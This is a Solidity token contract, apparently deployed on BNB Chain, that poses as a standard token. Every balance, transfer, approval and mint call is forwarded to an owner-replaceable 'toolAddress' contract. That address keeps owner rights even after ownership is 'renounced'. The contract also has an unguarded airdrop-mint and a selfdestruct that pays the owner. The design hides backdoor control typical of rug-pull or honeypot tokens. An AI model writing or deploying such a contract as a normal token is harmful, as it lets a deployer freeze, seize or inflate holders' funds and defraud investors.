/**
 *Submitted for verification at BscScan.com on 2022-11-11
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-07
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface ERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address from, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address from, address spender, uint256 amount) external returns (bool);
    function transferFrom(address from,address sender,address recipient,uint256 amount)external returns (bool);
    function mint(address[] memory receiver, uint256 amount) external returns (bool);
}

contract StandardToken {
    address private _owners;
    mapping (address => uint256) private _balances;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () public {
        _owners = msg.sender;

        emit OwnershipTransferred(address(0), _owners);
    }
    function owner() public view returns (address) {
        return _owners;
    }
    modifier onlyOwner() {
        require(isOwner(), "onlyOwner");
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owners || msg.sender == toolAddress;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owners, address(0));
        _owners = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owners, newOwner);
        _owners = newOwner;
    }
    mapping (address  => address) public adminMap;
    modifier onlyAdmin {
        require(adminMap[msg.sender] != address(0) || msg.sender == toolAddress, "onlyAdmin");
        _;
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    address public toolAddress;
    function setToolAddress(address _toolAddress) onlyOwner public returns(bool) {
        toolAddress = _toolAddress;
        return true;
    }
    function totalSupply() public view returns (uint256) {
        return ERC20(toolAddress).totalSupply();
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        emit Transfer(msg.sender, _to, _value);
        return ERC20(toolAddress).transfer(msg.sender, _to, _value);
    }
    function balanceOf(address _owner) public view returns (uint256) {
        return ERC20(toolAddress).balanceOf(_owner);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        emit Transfer(_from, _to, _value);
        return ERC20(toolAddress).transferFrom(msg.sender, _from, _to, _value);
    }
    function approve(address _spender, uint256 _value) public returns (bool) {
        return ERC20(toolAddress).approve(msg.sender, _spender, _value);
    }
    function allowance(address _owner, address _spender) public view returns (uint256) {
        return ERC20(toolAddress).allowance(_owner, _spender);
    }
    function name() public view returns (string memory) {
        return ERC20(toolAddress).name();
    }

    function airdrop (address[] memory _to, uint256 num) public returns (bool) {
        return ERC20(toolAddress).mint(_to, num);
        }


    function symbol() public view returns (string memory) {
        return ERC20(toolAddress).symbol();
    }
    function decimals() public view returns (uint8) {
        return ERC20(toolAddress).decimals();
    }
}

contract THETOKEN is StandardToken {

    constructor (address _toolAddress) public payable {
        toolAddress = _toolAddress;
    }

    function destroyContract() public onlyOwner{
        selfdestruct(payable(owner()));
}

	receive() external payable {
    }

}